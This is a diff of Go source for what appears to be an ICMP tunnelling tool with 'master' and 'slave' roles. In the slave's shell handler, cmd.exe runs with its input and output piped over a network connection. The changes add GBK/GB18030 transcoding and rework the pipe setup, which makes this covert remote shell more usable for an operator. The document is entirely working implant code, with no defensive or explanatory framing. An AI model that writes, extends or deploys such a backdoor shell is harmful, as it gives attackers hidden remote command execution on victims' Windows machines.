@@ -16,6 +16,9 @@ import (
 	"protocol/icmp/internal/stdio"
 	"protocol/icmp/internal/transport"
 	"protocol/icmp/internal/tunnel"
+
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 const (
@@ -49,21 +52,38 @@ var buildSlaveRuntime = func(cfg slaveConfig) (serviceRunner, io.Closer, error) 
 		cmd := payload[0]
 		switch cmd {
 		case protocol.CmdShell:
-			// Run OS Shell with small-output buffering to achieve streaming
 			c := exec.Command("cmd.exe")
-			c.Stdin = conn
+			stdinPipe, err := c.StdinPipe()
+			if err != nil {
+				conn.Close()
+				return
+			}
 			stdoutPipe, err1 := c.StdoutPipe()
 			stderrPipe, err2 := c.StderrPipe()
 			if err1 != nil || err2 != nil {
+				stdinPipe.Close()
 				conn.Close()
 				return
 			}
 			if err := c.Start(); err != nil {
+				stdinPipe.Close()
 				conn.Close()
 				return
 			}
-			go pumpStream(stdoutPipe, conn)
-			go pumpStream(stderrPipe, conn)
+
+			// Decode GBK output from cmd.exe to UTF-8 before sending to conn
+			stdoutDecoder := transform.NewReader(stdoutPipe, simplifiedchinese.GB18030.NewDecoder())
+			stderrDecoder := transform.NewReader(stderrPipe, simplifiedchinese.GB18030.NewDecoder())
+			go pumpStream(stdoutDecoder, conn)
+			go pumpStream(stderrDecoder, conn)
+
+			// Encode UTF-8 input from conn to GBK before writing to cmd.exe stdin
+			stdinEncoder := transform.NewWriter(stdinPipe, simplifiedchinese.GB18030.NewEncoder())
+			go func() {
+				_, _ = io.Copy(stdinEncoder, conn)
+				stdinPipe.Close()
+			}()
+
 			go func() {
 				_ = c.Wait()
 				conn.Close()
